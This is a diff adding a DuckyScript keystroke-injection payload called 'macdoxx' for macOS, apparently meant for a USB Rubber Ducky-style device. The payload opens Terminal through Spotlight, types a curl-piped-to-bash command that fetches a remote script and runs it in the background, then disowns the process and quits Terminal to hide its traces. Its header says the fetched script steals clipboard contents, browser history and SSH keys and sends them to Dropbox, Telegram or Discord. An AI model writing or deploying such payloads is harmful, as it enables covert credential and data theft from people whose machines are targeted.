@@ -1,0 +1,44 @@
+REM Title:          macdoxx
+REM Author:         CyberArtemio
+REM Description:    This payload exfiltrates a lot of information about the target where it
+REM                 has been executed. This includes but is not limited to installed applications list,
+REM                 clipboard content, browser history of the last 7 days, private and public SSH keys.
+REM                 It is possible to exfiltrate the loot through Dropbox, Telegram or Discord.
+REM Version:        v1.0
+REM Target:         MacOS 15.2
+
+DUCKY_LANG US
+
+REM ############################ CHANGE ME ################################
+
+DEFINE #SCRIPT_SOURCE <put_here_the_url_of_macdoxx_script>
+DEFINE #EXFIL_TO <put_here_where_you_want_to_exfil_data>
+DEFINE #ACCESS_TOKEN <put_here_your_access_token>
+
+REM #######################################################################
+
+DELAY 2000
+
+REM Launch spotlight. Use both combos old one and new one
+CTRL SPACE
+DELAY 200
+CTRL SPACE
+
+DELAY 100
+
+STRING Termin
+ENTER
+
+DELAY 300
+
+STRING nohup curl -s #SCRIPT_SOURCE | bash -s -- #EXFIL_TO #ACCESS_TOKEN &>/dev/null &
+ENTER
+
+DELAY 100
+
+STRING disown && exit
+ENTER
+
+DELAY 100
+
+GUI q
